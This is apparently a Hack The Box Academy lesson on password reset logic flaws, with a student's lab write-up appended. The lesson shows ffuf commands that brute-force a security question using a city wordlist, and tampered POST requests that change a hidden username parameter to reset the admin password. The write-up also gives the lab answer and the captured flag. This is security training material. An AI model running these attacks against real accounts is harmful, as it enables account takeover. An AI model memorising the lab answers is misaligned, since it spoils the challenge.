We have already discussed how to brute-force password reset tokens to take over a victim's account. However, even if a web application utilizes rate limiting and CAPTCHAs, business logic bugs within the password reset functionality can allow taking over other users' accounts.

---

## Guessable Password Reset Questions

Often, web applications authenticate users who have lost their passwords by requesting that they answer one or multiple security questions.Â During registration, users provide answers to predefined and generic security questions, disallowing users from entering custom ones. Therefore, within the same web application, the security questions of all users will be the same, allowing attackers to abuse them.

Assuming we had found such functionality on a target website, we should try abusing it to bypass authentication. Often, the weak link in a question-based password reset functionality is the predictability of the answers. It is common to find questions like the following:

- "`What is your mother's maiden name?`"
- "`What city were you born in?`"

While these questions seem tied to the individual user, they can often be obtained throughÂ `OSINT`Â or guessed, given a sufficient number of attempts, i.e., a lack of brute-force protection.

For instance, assuming a web application uses a security question likeÂ `What city were you born in?`:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_1.png)

We canÂ attempt toÂ brute-force the answer to this question by using a proper wordlist.Â There are multiple lists containing large cities in the world. For instance,Â [this](https://github.com/datasets/world-cities/blob/master/data/world-cities.csv)Â CSV file contains a list of more than 25,000 cities with more than 15,000 inhabitants from all over the world. This is a great starting point for brute-forcing the city a user was born in.

Since the CSV file contains the city name in the first field, we can create our wordlist containing only the city name on each line using the following command:


```shell-session
smoothment@htb[/htb]$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt

smoothment@htb[/htb]$ wc -l city_wordlist.txt 

26468 city_wordlist.txt
```

As we can see, this results in a total of 26,468 cities.

To set up our brute-force attack, we first need to specify the user we want to target:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_2.png)

As an example, we will target the userÂ `admin`. After specifying the username, we must answer the user's security question. The corresponding request looks like this:

![image](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_3.png)

We can set up the correspondingÂ `ffuf`Â command from this request to brute-force the answer. Keep in mind that we need to specify our session cookie to associate our request with the usernameÂ `admin`Â we specified in the previous step:

```shell-session
smoothment@htb[/htb]$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."

<SNIP>

[Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
    * FUZZ: Houston
```

After obtaining the security response, we can reset the admin user's password and entirely take over the account:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_4.png)

We could narrow down the cities if we had additional information on our target to reduce the time required for our brute-force attack on the security question. For instance, if we knew that our target user was from Germany, we could create a wordlist containing only German cities, reducing the number to about a thousand cities:

```shell-session
smoothment@htb[/htb]$ cat world-cities.csv | grep Germany | cut -d ',' -f1 > german_cities.txt

smoothment@htb[/htb]$ wc -l german_cities.txt 

1117 german_cities.txt
```

---

## Manipulating the Reset Request

Another instance of a flawed password reset logic occurs when a user can manipulate a potentially hidden parameter to reset the password of a different account.

For instance, consider the following password reset flow, which isÂ similar to the one discussed above. First, we specify the username:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_5.png)

We will use our demo accountÂ `htb-stdnt`, which results in the following request:

```http
POST /reset.php HTTP/1.1
Host: pwreset.htb
Content-Length: 18
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

username=htb-stdnt
```

Afterward, we need to supply the response to the security question:

Â Â Â 

![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_6.png)

Supplying the security responseÂ `London`Â results in the following request:


```http
POST /security_question.php HTTP/1.1
Host: pwreset.htb
Content-Length: 43
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

security_response=London&username=htb-stdnt
```

As we can see, the username is contained in the form as a hidden parameter and sent along with the security response. Finally, we can reset the user's password:


![](https://academy.hackthebox.com/storage/modules/269/pw/pwreset_7.png)

The final request looks like this:


```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 36
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=htb-stdnt
```

Like the previous request, the request contains the username in a separate POST parameter. Suppose the web application does properly verify that the usernames in both requests match. In that case, we can skip the security question or supply the answer to our security question and then set the password of an entirely different account. For instance, we can change the admin user's password by manipulating theÂ `username`Â parameter of the password reset request:


```http
POST /reset_password.php HTTP/1.1
Host: pwreset.htb
Content-Length: 32
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=39b54j201u3rhu4tab1pvdb4pv

password=P@$$w0rd&username=admin
```

To prevent this vulnerability, keeping a consistent state during the entire password reset process is essential. Resetting an account's password is a sensitive process where minor implementation flaws or logic bugs can enable an attacker to take over other users' accounts. As such, we should investigate the password reset functionality of any web application closely and keep an eye out for potential security issues.

# Questions
---

![Pasted image 20250214164409.png](../../../../IMAGES/Pasted%20image%2020250214164409.png)

Let's begin by visiting the website:

![Pasted image 20250214174940.png](../../../../IMAGES/Pasted%20image%2020250214174940.png)

We can reset the password, let's see it:

![Pasted image 20250214175101.png](../../../../IMAGES/Pasted%20image%2020250214175101.png)

We can enter the `admin` username for example:

![Pasted image 20250214175120.png](../../../../IMAGES/Pasted%20image%2020250214175120.png)

We got a password reset question, this can be guessed through OSINT or even brute-force, for this exercise, let's bruteforce in the following way:

Let's begin by getting our file containing world cities:

```
wget https://raw.githubusercontent.com/datasets/world-cities/refs/heads/main/data/world-cities.csv
```

Now, we need to modify this file a bit, it contains the name of the city in the first field, we can filter it using this command:

```
awk -F'"?,"?' '{print $1}' world-cities.csv > city_wordlist.txt
```

Let's check the error response:

![Pasted image 20250214180001.png](../../../../IMAGES/Pasted%20image%2020250214180001.png)

Now, we can use ffuf:

```
ffuf -w city_wordlist.txt -u http://94.237.50.242:40498/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=vaqmcll67v0s0aif4rtq0jiggq" -d "security_response=FUZZ" -fr "Incorrect response." -ic -c -t 200 
```

We get this output:

```
ffuf -w city_wordlist.txt -u http://94.237.50.242:40498/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=vaqmcll67v0s0aif4rtq0jiggq" -d "security_response=FUZZ" -fr "Incorrect response." -ic -c -t 200

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://94.237.50.242:40498/security_question.php
 :: Wordlist         : FUZZ: /home/samsepiol/city_wordlist.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Cookie: PHPSESSID=vaqmcll67v0s0aif4rtq0jiggq
 :: Data             : security_response=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Incorrect response.
________________________________________________

Manchester              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 149ms]
```

Answer for first question is `Manchester`, we got `302` status code, which means we are now able to reset the password:

![Pasted image 20250214180234.png](../../../../IMAGES/Pasted%20image%2020250214180234.png)

Let's go with the following credentials:

```ad-note
`admin`:`password`
```

![Pasted image 20250214180310.png](../../../../IMAGES/Pasted%20image%2020250214180310.png)

And we can now log into the admin panel:

![Pasted image 20250214180332.png](../../../../IMAGES/Pasted%20image%2020250214180332.png)

Flag is:

```
HTB{d4740b1801d9880ff70de227a54309f0}
```
